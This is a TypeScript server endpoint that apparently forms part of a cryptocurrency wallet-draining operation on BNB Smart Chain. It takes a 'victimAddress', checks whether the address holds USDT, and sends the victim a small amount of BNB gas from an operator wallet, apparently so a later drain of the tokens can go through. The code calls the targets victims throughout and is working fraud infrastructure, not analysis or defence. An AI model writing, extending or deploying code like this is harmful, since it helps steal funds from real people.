// server/api/fund-gas.ts
import { defineEventHandler, readBody, setResponseHeaders, H3Event } from 'h3';
import { ethers } from 'ethers';

export default defineEventHandler(async (event: H3Event) => {
  setResponseHeaders(event, {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, x-auth-key',
  });

  if (event.method === 'OPTIONS') {
    return { success: true };
  }

  // Check auth key
  const authHeader = event.headers.get('x-auth-key');
  if (authHeader !== process.env.AUTH_KEY) {
    return { success: false, error: 'Unauthorized' };
  }

  const { victimAddress } = await readBody(event);
  if (!victimAddress) {
    return { success: false, error: 'Missing victimAddress' };
  }

  const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY;
  const RPC_URL = "https://bsc-dataseed.binance.org/";
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
  const minBalance = ethers.parseEther('0.0001'); // Victim needs at least 0.0001 BNB
  const gasAmount = ethers.parseEther('0.0001'); // Send 0.0001 BNB per victim

  // USDT Contract
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const usdtAbi = ["function balanceOf(address) view returns (uint256)"];
  const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, provider);

  try {
    // Check victim's USDT balance
    const usdtBalance = await usdtContract.balanceOf(victimAddress);
    if (usdtBalance === 0n) {
      return { success: false, message: 'Victim has no USDT. Skipping gas funding.' };
    }

    // Check funding wallet balance
    const fundingBalance = await provider.getBalance(fundingWallet.address);
    if (fundingBalance < gasAmount) {
      return { success: false, error: 'Funding wallet has insufficient BNB' };
    }

    // Check victim's BNB balance
    const balance = await provider.getBalance(victimAddress);
    if (balance < minBalance) {
      const tx = await fundingWallet.sendTransaction({
        to: victimAddress,
        value: gasAmount,
        gasPrice: await provider.getFeeData().then((fee) => fee.gasPrice),
        gasLimit: 21000,
      });
      await tx.wait();
      return { success: true, txHash: tx.hash };
    } else {
      return { success: true, message: 'Victim has enough BNB.' };
    }
  } catch (error: any) {
    console.error('Gas funding error:', error);
    return { success: false, error: error.message };
  }
});